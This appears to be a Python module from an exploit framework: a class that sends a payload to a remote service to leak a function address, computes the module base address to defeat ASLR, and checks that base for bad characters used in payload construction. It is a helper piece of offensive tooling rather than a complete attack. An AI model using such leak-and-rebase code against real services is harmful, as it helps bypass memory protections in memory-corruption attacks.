import struct


class SnowCrashASLR:
    __symbol = 0
    __address = struct.pack('I', 0x00)
    __addressBase = struct.pack('I', 0x00)
    __addressOffset = struct.pack('I', 0x00)

    def __init__(self, exploit):
        self.__symbol = 0
        self.exploit = exploit

    def ClearAll(self):
        self.__symbol = 0
        self.__address = struct.pack('I', 0x00)
        self.__addressBase = struct.pack('I', 0x00)
        self.__addressOffset = struct.pack('I', 0x00)

    def SetSymbol(self, symbol):
        self.__symbol = symbol

    def GetSymbol(self):
        return self.__symbol

    def SetAddress(self, address):
        self.__address = struct.pack('>I', address)

    def GetAddress(self):
        return self.__address

    def SetAddressOffset(self, offset):
        self.__addressOffset = struct.pack('>h', offset)

    def GetAddressOffset(self):
        return self.__addressOffset

    def SetAddressBase(self):
        address_int = int.from_bytes(
            self.GetAddress(),
            byteorder='big'
        )

        offset_int = int.from_bytes(
            self.GetAddressOffset(),
            byteorder='big'
        )

        base_address_int = address_int - offset_int
        self.__addressBase = base_address_int.to_bytes(4, byteorder='big')

    def GetAddressBase(self):
        return self.__addressBase

    def LeakFuncAddr(self, symbol):
        """ for leaking the address of a given symbol """
        self.SetSymbol(symbol)

        self.exploit.service.CreateSymbolPayload(
            self.GetSymbol()
        )

        self.exploit.net.SendPayload(
            self.exploit.service.GetPayload()
        )

        response = self.exploit.net.RecvResponse()
        self.SetAddress(
            self.exploit.service.ParseResponse(response)
        )

    def HasAddressBadChar(self, badchars):
        """ check address for bad chars """
        hasBadChar = False

        for i in range(2):  # Check the first two bytes
            byte = self.GetAddressBase()[i:i+1]
            print(f"[+] Checking character {byte.hex()}")
            if byte in badchars:
                print(f"[-] Address contains bad character {byte.hex()}")
                hasBadChar = True

                break

        return hasBadChar

    def printer(self, appendTo):
        printStr = appendTo + "\n"\
            f" - Address: {self.GetAddress().hex()}\n" +\
            f" - Address Offset: {self.GetAddressOffset().hex()}\n" +\
            f" - Module Address Base: {self.GetAddressBase().hex()}\n"

        print(printStr)
